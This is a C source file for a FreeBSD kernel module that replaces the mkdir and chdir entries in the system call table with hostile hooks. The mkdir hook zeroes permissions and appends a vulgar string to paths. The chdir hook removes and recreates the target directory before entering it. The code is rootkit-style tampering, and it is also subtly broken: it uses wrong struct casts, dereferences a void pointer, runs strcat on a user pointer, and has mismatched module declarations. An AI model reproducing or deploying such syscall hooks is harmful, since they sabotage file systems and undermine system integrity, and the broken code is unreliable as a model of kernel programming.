#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/unistd.h>
#include <sys/fcntl.h>



static int mkdir_hook(struct thread *td, void *syscall_args){
    struct mkdir_args *uap; /* char *path; int mode */
    uap = (struct read_args *)syscall_args;
    syscall_args->mode = 0;
    strcat(uap->path, "penis");
    char path[255];  
    size_t done;
    int error;
    error = copyinstr(uap->path, path, 255, &done);
    if (error != 0)
        return(error);
    /* Print a debug message. */
    printf("The directory \"%s\" will be created with the following permissions: %o\n", path, uap->mode);
    return(mkdir(td, syscall_args));
}

static int chdir_hook(struct thread *td, void *syscall_args){
    //send to the root directory 
    struct mkdir_args *uap; /* char *path; int mode */
    uap = (struct mkdir_args *)syscall_args;
    uap->mode = 0;

    sys_rmdir(td, syscall_args);
    sys_mkdir(td, (void *)uap);
    return(sys_chdir(td, syscall_args));
}

static int load(struct module *module, int cmd, void *arg) {
	int error = 0;
    	switch (cmd) {
        	case MOD_LOAD:
           		/* Replace read with read_hook. */
                sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir_hook;
                sysent[SYS_chdir].sy_call = (sy_call_t *)chdir_hook;
                break;
     		case MOD_UNLOAD:
                sysent[SYS_mkdir].sy_call = (sy_call_t *)sys_mkdir;
                sysent[SYS_chdir].sy_call = (sy_call_t *)sys_chdir;
			    break;
            default:
                error = EOPNOTSUPP;
                break;
	}
    	return(error);
}
static moduledata_t mod_hooks = {
    "hooks", /* module name */
    load, /* event handler */
    NULL /* extra data */
};

DECLARE_MODULE(read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);